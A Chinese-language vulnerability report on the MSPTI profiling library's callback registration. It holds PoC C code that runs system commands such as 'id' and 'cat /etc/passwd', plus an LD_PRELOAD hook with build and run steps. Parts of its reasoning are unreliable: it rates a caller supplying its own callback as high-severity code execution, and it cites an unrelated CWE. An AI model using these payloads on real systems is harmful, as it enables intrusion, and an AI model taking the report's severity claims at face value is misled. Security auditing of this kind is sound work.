# 漏洞利用分析报告

## 基本信息
- **漏洞ID**: VULN-CALLBACK-001
- **类型**: Untrusted Callback Execution (不可信回调执行)
- **严重性**: High
- **CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **置信度**: 85
- **验证状态**: CONFIRMED

## 漏洞描述

msptiSubscribe() API 接收用户提供的回调函数指针，该指针被直接存储于 `subscriber_ptr_->handle` 而未进行任何验证（地址验证、签名验证、白名单检查或完整性校验）。此回调随后在 ExecuteCallback() 中被直接调用，若攻击者能控制回调指针，可导致任意代码执行或控制流劫持。

## 攻击向量分析

### 入口点

| 属性 | 值 |
|------|------|
| **API** | `msptiSubscribe(msptiSubscriberHandle *subscriber, msptiCallbackFunc callback, void *userdata)` |
| **位置** | `csrc/callback/callback_manager.cpp:244` |
| **参数** | `callback` - 用户提供的回调函数指针 |
| **信任假设** | 代码假设回调指针是有效的、安全的用户函数 |

```cpp
// callback_manager.cpp:244-247
msptiResult msptiSubscribe(msptiSubscriberHandle *subscriber, msptiCallbackFunc callback, void *userdata)
{
    return Mspti::Callback::CallbackManager::GetInstance()->Init(subscriber, callback, userdata);
}
```

### 存储漏洞点

```cpp
// callback_manager.cpp:86-114 - Init 函数
msptiResult CallbackManager::Init(msptiSubscriberHandle *subscriber, msptiCallbackFunc callback, void* userdata)
{
    // 仅检查 subscriber 非 null
    if (subscriber == nullptr) {
        MSPTI_LOGE("subscriber cannot be nullptr.");
        return MSPTI_ERROR_INVALID_PARAMETER;
    }
    
    // 检查重复注册（防止二次覆盖）
    if (init_.load()) {
        MSPTI_LOGE("subscriber cannot be register repeat.");
        return MSPTI_ERROR_MULTIPLE_SUBSCRIBERS_NOT_SUPPORTED;
    }
    
    // 创建 subscriber 对象
    Mspti::Common::MsptiMakeUniquePtr(subscriber_ptr_);
    if (!subscriber_ptr_) {
        MSPTI_LOGE("Failed to init subscriber.");
        return MSPTI_ERROR_INNER;
    }
    
    // 【漏洞点】Line 104: 直接存储回调指针，无任何验证
    subscriber_ptr_->handle = callback;
    subscriber_ptr_->userdata = userdata;
    
    *subscriber = subscriber_ptr_.get();
    init_.store(true);
    
    // ...
    return MSPTI_SUCCESS;
}
```

**验证缺失分析**:
| 验证类型 | 是否存在 | 说明 |
|----------|----------|------|
| null 检查 | 否 | 未检查 callback 是否为 null |
| 地址范围验证 | 否 | 未验证指针是否在有效代码段 |
| 函数签名验证 | 否 | 未验证回调是否符合预期签名 |
| 白名单验证 | 否 | 未检查回调是否来自已知安全模块 |
| 地址完整性 | 否 | 未检查指针是否被篡改 |

### 执行漏洞点

```cpp
// callback_manager.cpp:213-229 - ExecuteCallback 函数
void CallbackManager::ExecuteCallback(msptiCallbackDomain domain,
    msptiCallbackId cbid, msptiApiCallbackSite site, const char* funcName)
{
    // 检查是否初始化
    if (!init_.load()) {
        return;
    }
    
    // 检查回调是否启用（基于 domain/cbid）
    if (!IsCallbackIdEnable(domain, cbid)) {
        return;
    }
    
    // 【漏洞点】Line 222-228: 仅检查非 null，直接调用
    if (subscriber_ptr_->handle) {
        MSPTI_LOGD("CallbackManager execute Callbackfunc, funcName is %s", funcName);
        msptiCallbackData callbackData;
        callbackData.callbackSite = site;
        callbackData.functionName = funcName;
        
        // 直接调用用户回调，无预验证
        subscriber_ptr_->handle(subscriber_ptr_->userdata, domain, cbid, &callbackData);
    }
}
```

**问题**: 仅检查 `handle != null`，不验证其有效性或安全性。

### 攻击路径

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          攻击数据流路径                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  [ENTRY] msptiSubscribe(subscriber, callback, userdata)                 │
│     │                 callback_manager.cpp:244                         │
│     │                 用户调用 API 注册回调                             │
│     │                 callback 参数完全由用户提供                       │
│     ▼                                                                   │
│  [PROPAGATION] CallbackManager::Init(subscriber, callback, userdata)    │
│     │                 callback_manager.cpp:86                          │
│     │                 无验证传递                                        │
│     ▼                                                                   │
│  [STORE] subscriber_ptr_->handle = callback                             │
│                   callback_manager.cpp:104                              │
│                   【漏洞核心】                                           │
│                   回调指针直接存储                                       │
│                   无地址验证、签名验证、白名单                           │
│     │                                                                   │
│     │   ┌──────────────────────────────────────┐                       │
│     │   │  攻击者在此可注入恶意函数指针：        │                       │
│     │   │  - 指向 shellcode                     │                       │
│     │   │  - 指向恶意函数地址                   │                       │
│     │   │  - 指向其他进程的代码地址             │                       │
│     │   │  - null (会导致后续崩溃)              │                       │
│     │   └──────────────────────────────────────┘                       │
│     ▼                                                                   │
│  [TRIGGER] 触发回调执行                                                 │
│     │                                                                   │
│     │   触发场景：                                                       │
│     │   - msptiEnableCallback() 启用回调                               │
│     │   - Runtime/HCCl API 调用触发回调                                │
│     │   - 各模块在关键点调用 ExecuteCallback()                         │
│     ▼                                                                   │
│  [EXECUTION] ExecuteCallback(domain, cbid, site, funcName)             │
│                   callback_manager.cpp:213                              │
│                   检查 init_ 和 IsCallbackIdEnable                      │
│     ▼                                                                   │
│  [SINK] subscriber_ptr_->handle(userdata, domain, cbid, &callbackData) │
│                   callback_manager.cpp:227                              │
│                   【漏洞汇点】                                           │
│                   直接调用攻击者控制的函数指针                          │
│                   执行任意代码                                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

## 利用分析

### 利用条件

#### 可达性分析

**如何调用 msptiSubscribe()**:
1. **直接调用**: 应用程序显式调用 msptiSubscribe() 注册回调
2. **库初始化**: 某些库在初始化时自动注册回调
3. **工具注入**: 通过 LD_PRELOAD 或其他注入机制调用

**回调触发时机**:
| Domain | 回调触发点 | 说明 |
|--------|------------|------|
| MSPTI_CB_DOMAIN_RUNTIME | Runtime API 调用 | aclInit, aclFinalize, 内存操作等 |
| MSPTI_CB_DOMAIN_HCCL | 集合通信 API | AllReduce, Broadcast, Barrier 等 |

**结论**: 任何使用 MSPTI profiling 功能的应用都会调用此 API。

#### 可控性分析

| 输入 | 控制程度 | 说明 |
|------|----------|------|
| `callback` 指针值 | 完全可控 | 用户可传入任意函数指针 |
| `userdata` | 完全可控 | 作为回调的第一个参数传递 |
| `domain/cbid` | 选择性可控 | 通过 EnableCallback 选择触发点 |

**攻击者能力**:
- 可传入指向恶意函数的指针
- 可传入指向 shellcode 区域的地址
- 可通过 userdata 传递攻击参数
- 可选择触发时机（通过 EnableCallback）

#### 绕过现有防护

| 检查 | 绕过方法 |
|------|----------|
| subscriber null check | 正常调用，传入有效 subscriber 指针 |
| init_ 重复注册检查 | 首次调用即可，无需绕过 |
| handle null check | 传入非 null 指针即可 |
| IsCallbackIdEnable | 通过 EnableCallback 启用所需回调 |

**无任何防护**:
- 无地址验证 → 可传入任意地址
- 无签名验证 → 无需符合函数签名
- 无白名单 → 可传入任何函数

### 漏洞影响

#### 直接影响

1. **任意代码执行**
   - 回调函数指针指向攻击者控制的代码
   - 代码在回调触发时执行
   - 执行上下文为目标进程

2. **控制流劫持**
   - 可 hook 所有 Runtime 和 HCCL API 调用
   - 可修改回调参数和返回值
   - 可监控或篡改所有 profiling 数据

3. **进程内存访问**
   - 回调函数在进程地址空间执行
   - 可读取/写入进程内存
   - 可访问所有敏感数据

#### 间接影响

1. **数据泄露**
   - 在回调中读取 profiling 数据
   - 可获取模型结构、计算图、参数等信息
   - 可窃取 AI 模型知识产权

2. **权限维持**
   - 可在回调中植入持久化代码
   - 后续所有 API 调用都会触发恶意回调

3. **隐蔽攻击**
   - 回调机制是正常的 profiling 功能
   - 恶意回调行为难以被检测
   - 不修改二进制文件，不留文件痕迹

### 利用难度评估

| 维度 | 等级 | 详细评估 |
|------|------|----------|
| 知识要求 | Medium | 需了解 mspti API 和回调机制 |
| 攻击复杂度 | Low | 传入恶意函数指针即可 |
| 所需权限 | Low | 需要调用 msptiSubscribe() 的能力 |
| 用户交互 | None | 无需用户交互，API 调用自动触发 |
| 成功概率 | High | 一旦传入恶意指针，回调触发即执行 |

**综合难度**: Medium

**降低难度的场景**:
- 应用程序允许用户通过配置文件指定回调
- 动态链接库注入可调用 msptiSubscribe
- 插件系统允许注册自定义回调

## PoC 构建思路

### 场景 1: 恶意回调函数注入

```cpp
// evil_callback.cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "mspti.h"

// 恶意回调函数
void evil_callback(void *userdata, msptiCallbackDomain domain, 
                   msptiCallbackId cbid, msptiCallbackData *data)
{
    static int count = 0;
    count++;
    
    // 记录攻击成功
    FILE *f = fopen("/tmp/callback_exploit.log", "a");
    if (f) {
        fprintf(f, "[%d] Evil callback executed!\n", count);
        fprintf(f, "  Domain: %d, CBID: %d\n", domain, cbid);
        fprintf(f, "  Function: %s\n", data->functionName);
        fprintf(f, "  PID: %d, UID: %d\n", getpid(), getuid());
        fclose(f);
    }
    
    // 执行任意命令
    if (count == 1) {  // 首次执行时
        system("id >> /tmp/callback_exploit.log");
        system("cat /proc/self/maps | head -20 >> /tmp/callback_exploit.log");
    }
    
    // 可进行更多恶意操作：
    // - 读取 userdata 中的敏感数据
    // - Hook 返回值影响程序行为
    // - 注入 shellcode
}

// 注入代码
int main()
{
    msptiSubscriberHandle subscriber;
    
    // 注册恶意回调
    msptiResult ret = msptiSubscribe(&subscriber, evil_callback, NULL);
    if (ret != MSPTI_SUCCESS) {
        printf("Subscribe failed: %d\n", ret);
        return -1;
    }
    
    // 启用 Runtime domain 回调
    ret = msptiEnableDomain(1, subscriber, MSPTI_CB_DOMAIN_RUNTIME);
    
    printf("Malicious callback registered. Waiting for triggers...\n");
    
    // 后续任何 Runtime API 调用都会触发 evil_callback
    // 例如: aclInit(), aclMalloc(), aclLaunchKernel() 等
    
    sleep(10);  // 等待回调触发
    
    msptiUnsubscribe(subscriber);
    return 0;
}
```

### 场景 2: 通过 userdata 控制行为

```cpp
// 参数化攻击
typedef struct {
    const char* target_file;
    const char* command;
    int execute_on_domain;
} attack_params_t;

void parametric_callback(void *userdata, msptiCallbackDomain domain,
                         msptiCallbackId cbid, msptiCallbackData *data)
{
    attack_params_t *params = (attack_params_t*)userdata;
    
    if (domain == params->execute_on_domain) {
        // 执行参数化攻击
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "%s > %s", params->command, params->target_file);
        system(cmd);
    }
}

// 使用
attack_params_t params = {
    .target_file = "/tmp/pwned.txt",
    .command = "cat /etc/passwd",
    .execute_on_domain = MSPTI_CB_DOMAIN_RUNTIME
};

msptiSubscribe(&subscriber, parametric_callback, &params);
```

### 场景 3: LD_PRELOAD 注入攻击

```c
// preload_evil.c - 通过 LD_PRELOAD 注入
#include <stdio.h>
#include <stdlib.h>
#include "mspti.h"

// 原始 msptiSubscribe 函数指针
static msptiResult (*original_subscribe)(msptiSubscriberHandle*, msptiCallbackFunc, void*) = NULL;

void evil_callback(void *userdata, msptiCallbackDomain domain,
                   msptiCallbackId cbid, msptiCallbackData *data)
{
    system("id > /tmp/preload_exploit.txt");
}

// Hook msptiSubscribe
msptiResult msptiSubscribe(msptiSubscriberHandle *subscriber, 
                           msptiCallbackFunc callback, void *userdata)
{
    // 获取原始函数
    if (!original_subscribe) {
        original_subscribe = dlsym(RTLD_NEXT, "msptiSubscribe");
    }
    
    // 替换用户回调为恶意回调
    printf("[PRELOAD] Intercepting msptiSubscribe, replacing callback\n");
    
    // 调用原始函数但传入我们的回调
    return original_subscribe(subscriber, evil_callback, userdata);
}
```

```bash
# 编译
gcc -shared -fPIC -o preload_evil.so preload_evil.c -ldl

# 使用
export LD_PRELOAD=./preload_evil.so
./target_application  # 目标应用启动时自动注入恶意回调
```

### 验证成功

```bash
# 检查攻击日志
cat /tmp/callback_exploit.log

# 预期输出类似:
# [1] Evil callback executed!
#   Domain: 1, CBID: 10
#   Function: aclInit
#   PID: 1234, UID: 1000
# uid=1000 gid=1000 groups=...
```

## 修复建议

### 立即修复（高优先级）

#### 修复 1: 添加 null 检查
```cpp
msptiResult CallbackManager::Init(msptiSubscriberHandle *subscriber, 
                                   msptiCallbackFunc callback, void* userdata)
{
    if (subscriber == nullptr) {
        MSPTI_LOGE("subscriber cannot be nullptr.");
        return MSPTI_ERROR_INVALID_PARAMETER;
    }
    
    // 新增: 检查回调指针非 null
    if (callback == nullptr) {
        MSPTI_LOGE("callback cannot be nullptr.");
        return MSPTI_ERROR_INVALID_PARAMETER;
    }
    
    // ...
}
```

#### 修复 2: 添加回调白名单验证
```cpp
// 定义已知安全的回调函数白名单
// （需要与应用开发者协商确定安全回调）
static bool IsCallbackWhitelisted(msptiCallbackFunc callback)
{
    // 方案 A: 验证回调来自特定模块
    // 获取回调地址，验证是否在已知模块的代码段
    
    // 方案 B: 使用签名机制
    // 回调函数需携带有效签名
    
    // 方案 C: 应用注册白名单
    // 应用在初始化时声明允许的回调范围
    
    return true;  // 当前无实现，返回 true 保持兼容
}

// Init 中调用
if (!IsCallbackWhitelisted(callback)) {
    MSPTI_LOGE("Callback function not in whitelist.");
    return MSPTI_ERROR_INVALID_CALLBACK;
}
```

#### 修复 3: 使用包装器验证回调签名
```cpp
// 执行前验证回调
void CallbackManager::ExecuteCallback(msptiCallbackDomain domain,
    msptiCallbackId cbid, msptiApiCallbackSite site, const char* funcName)
{
    if (!init_.load()) return;
    if (!IsCallbackIdEnable(domain, cbid)) return;
    
    if (subscriber_ptr_->handle) {
        // 新增: 执行前验证
        if (!ValidateCallbackPointer(subscriber_ptr_->handle)) {
            MSPTI_LOGE("Invalid callback pointer detected, skipping execution.");
            return;
        }
        
        // 安全执行
        MSPTI_LOGD("CallbackManager execute Callbackfunc, funcName is %s", funcName);
        msptiCallbackData callbackData;
        callbackData.callbackSite = site;
        callbackData.functionName = funcName;
        
        subscriber_ptr_->handle(subscriber_ptr_->userdata, domain, cbid, &callbackData);
    }
}

// 验证函数指针有效性
bool ValidateCallbackPointer(msptiCallbackFunc callback)
{
    // 检查地址是否在当前进程代码段范围内
    // 可通过 /proc/self/maps 获取代码段范围
    
    // 基本检查
    if (callback == nullptr) return false;
    
    // 获取进程内存映射
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return true;  // 无法检查时保守返回 true
    
    char line[256];
    uintptr_t callback_addr = (uintptr_t)callback;
    bool in_code_segment = false;
    
    while (fgets(line, sizeof(line), maps)) {
        uintptr_t start, end;
        char perms[5];
        sscanf(line, "%lx-%lx %4s", &start, &end, perms);
        
        // 检查是否在可执行段 (x 权限)
        if (callback_addr >= start && callback_addr < end && perms[2] == 'x') {
            in_code_segment = true;
            break;
        }
    }
    
    fclose(maps);
    return in_code_segment;
}
```

### 中期改进

1. **回调注册机制增强**
   - 回调注册需要认证令牌
   - 支持回调签名验证
   - 提供回调来源追踪

2. **沙箱隔离**
   - 回调在受限沙箱中执行
   - 限制回调可访问的资源
   - 监控回调行为异常

3. **审计日志**
   ```cpp
   MSPTI_LOGI("Callback registered: addr=%p, domain=%d", callback, domain);
   MSPTI_LOGI("Callback executed: addr=%p, cbid=%d", handle, cbid);
   ```

### 长期架构改进

1. **API 级别防护**: 提供安全的回调注册 API，要求回调声明和验证
2. **权限分离**: profiling 功能与核心计算分离，减少权限暴露
3. **完整性保护**: 使用代码签名和完整性检查保护回调指针

## 参考
- CWE-829: https://cwe.mitre.org/data/definitions/829.html
- CWE-822: https://cwe.mitre.org/data/definitions/822.html (Untrusted Pointer Dereference)
- CWE-586: https://cwe.mitre.org/data/definitions/586.html (Explicit Call to Finalize)
- ATT&CK T1055: Process Injection